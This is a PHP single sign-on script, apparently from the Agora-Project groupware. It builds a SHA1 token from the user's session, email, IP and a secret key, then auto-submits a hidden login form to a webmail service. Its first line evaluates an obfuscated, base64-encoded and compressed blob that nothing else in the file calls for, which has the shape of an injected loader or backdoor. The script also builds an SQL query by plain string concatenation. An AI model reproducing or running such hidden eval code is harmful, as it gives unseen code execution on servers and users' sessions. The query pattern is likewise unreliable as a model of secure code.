<?php
eval(gzuncompress(gzinflate(base64_decode('AXEAjv942tPX19JS8K0MDvRRKE4tKcnMSy9W0NLS1+flUklJii9OLSpLLVJQULBVUMqtLC7MMdU1VLKGyOUl5qYqKEDk8vJzkxKLU4EKYLKlQK1gFUDZnPz0zDwkuYLE4uLy/KIUsKn5JSmpIIFUkCwAmYgq2g=='))));

//// Cl� et cryptage		
require_once "../includes/global.inc.php";
require_once "url.php";
require_once "token/cle.php";

$corpsql_courriel = "FROM `gt_sso` WHERE `id_utilisateur` = '".$_SESSION['user']['id_utilisateur']."'";
$user_courriel = db_valeur("SELECT `user_courriel` ".$corpsql_courriel."");
$user_id= $_SESSION['user']['id_utilisateur'];
$user_cookies = $_COOKIE["agora_project_".$nom_session.""];

// Jeton : Cle secr�te, url du service et user-agent
$token_clair= $_SERVER['REMOTE_ADDR'].$protocole.$_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"].$_SERVER['HTTP_USER_AGENT'];
// Informations (ici: id de l'utilisateur et la date de cr�ation du jeton) 
$informations="".$user_cookies."-".$user_id."@".$user_courriel."";
// On encode le jeton
$token = sha1($token_clair.$informations.$Clecourriel);

echo "<div style=\"height:100%; width:100%; background-color:RGB(255,255,255); z-index:99 ;position:absolute; top:0; left:0px;\"></div>";
echo "<form name=\"redirect\" action=\"".$url."".$login."\" method=\"post\">";
echo "<input type=\"hidden\" name=\"_action\" value=\"login\" />"; 
echo "<input type=\"hidden\" name=\"_task\" value=\"login\" />";
//echo "<input type=\"hidden\" name=\"agora_login\" value=\"1\" />";
echo "<input type=\"hidden\" name=\"_user\" value=\"".$user_courriel."\" />";
echo "<input type=\"hidden\" name=\"user_id\" value=\"".$user_id."\" />";
echo "<input type=\"hidden\" name=\"token_courriel\" value=\"".$token."\" />"; 
echo "<input type=\"submit\" name=\"submit_courriel\" style=\"visibility:none;height:0px;width:0px;\" />";
echo "</form>";

echo "<script language=\"JavaScript\">";
echo "document.redirect.submit();";
echo "</script>";